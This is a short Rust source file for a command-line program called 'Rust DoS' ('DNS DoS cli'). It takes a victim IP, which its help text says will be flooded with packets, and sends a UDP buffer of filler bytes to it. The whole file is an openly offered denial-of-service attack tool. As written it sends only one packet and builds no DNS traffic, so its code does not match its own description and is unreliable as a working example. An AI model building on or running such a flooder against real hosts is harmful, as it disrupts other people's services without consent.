use clap::{Arg, ArgAction, Command};
use std::net::UdpSocket;
// use std::env;

fn main() -> std::io::Result<()>
{
    // env::set_var("RUST_BACKTRACE", "1");
    let matches = Command::new("Rust DoS")
        .about("DNS DoS cli")
        .version("1.0")
        .author("Raaven")
        .disable_help_flag(true)
        .arg(Arg::new("victim-ip")
            .short('X')
            .long("victim-ip")
            .help("Set the IP that will be flooded with packets.")
            .required(true))
        .arg(Arg::new("host-ip")
            .short('H')
            .long("host-ip")
            .help("Set the host IP to send packets.")
            .default_value("0.0.0.0:4444"))
        .arg(Arg::new("help")
            .short('h')
            .long("help")
            .global(true)
            .action(ArgAction::Help)).get_matches();

    {
        println!("\nVictim-IP: {:?}\nHost-IP: {:?}", matches.get_one::<String>("victim-ip").unwrap(), matches.get_one::<String>("host-ip").unwrap());

        // create socket on self
        let host = matches.get_one::<String>("host-ip").unwrap();
        let socket = UdpSocket::bind(&host).expect("Couldn't bind to address");

        //connect to victim server
        let victim = matches.get_one::<String>("victim-ip").unwrap();
        socket.connect(&victim).expect("connect function failed");

        //send packets to server
        let mut buf = [0u8; 8102];
        // socket.send(&[0u8; 1500]).expect("couldn't send message"); //requires connect

        buf.fill(8);

        match socket.send_to(&buf, victim) {
            Ok(number_of_bytes) => println!("{:?}", number_of_bytes),
            Err(fail) => println!("failed sending {:?}", fail),
        }
        // let socket 
    } // socket closes here

    Ok(())
}
